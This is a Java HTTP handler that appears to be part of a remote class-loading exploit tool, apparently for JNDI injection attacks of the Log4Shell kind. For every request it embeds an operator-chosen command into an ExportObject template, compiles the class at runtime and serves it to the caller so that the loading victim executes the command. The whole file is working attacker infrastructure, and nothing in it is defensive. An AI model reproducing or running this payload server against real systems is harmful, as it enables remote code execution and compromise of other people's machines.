package gds.els;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;

import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

import org.apache.commons.io.IOUtils;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;


public class HttpFileHandler implements HttpHandler {

	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
	private String command;
	
	public HttpFileHandler(String command) {
		this.command = command;
	}

	public void handle(HttpExchange httpExchange) {

		System.out.println("[+] new http request from " + httpExchange.getRemoteAddress() + " " + httpExchange.getRequestURI());

		try (InputStream inputStream = MyHttpServer.class.getClassLoader().getResourceAsStream("ExportObject.template") )
		{
			if (null == inputStream || inputStream.available() < 0) {
				System.out.println("[-] ExportObject.template not found");
				System.out.println("[-] HTTP server not running");
				System.exit(1);
			}

			// create ExportObject.java file
			File temp = new File(TEMP_DIR + File.separator + "ExportObject.java");
			try (PrintWriter out = new PrintWriter(temp) ) {
				System.out.println("[+] creating file " + temp.getName() + " with embedded command: " + command);
				String str = IOUtils.toString(inputStream, StandardCharsets.UTF_8);
				String res = str.replace("<COMMAND>", command.replace("\"", "\\\""));
				out.write(res);
			}

			// compile at runtime
	        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
	        if (null == compiler) {
				System.out.println("[-] JavaCompiler is null - use JDK instead of JRE");
				System.exit(2);
	        }
	        if (0 != compiler.run(null, null, null, temp.getAbsolutePath())) {
				System.out.println("[-] JavaCompiler failed");
				System.exit(3);
	        }
	        File res = temp.toPath().getParent().resolve("ExportObject.class").toFile();
			System.out.println("[+] compiling file " + res.getName());
			
			// return the compiled class
			try (InputStream is = new FileInputStream(res) ) {

				System.out.println("[+] serving file: " + res.getAbsolutePath());

				ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
				while (is.available() > 0) {
					byteArrayOutputStream.write(is.read());
				}

				byte[] bytes = byteArrayOutputStream.toByteArray();
				httpExchange.sendResponseHeaders(200, bytes.length);
				httpExchange.getResponseBody().write(bytes);
				httpExchange.close();
			}
			
			// remove temp files
			temp.delete();
			res.delete();
	        
		} catch (IOException e) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.exit(4);
		} 
	}
}
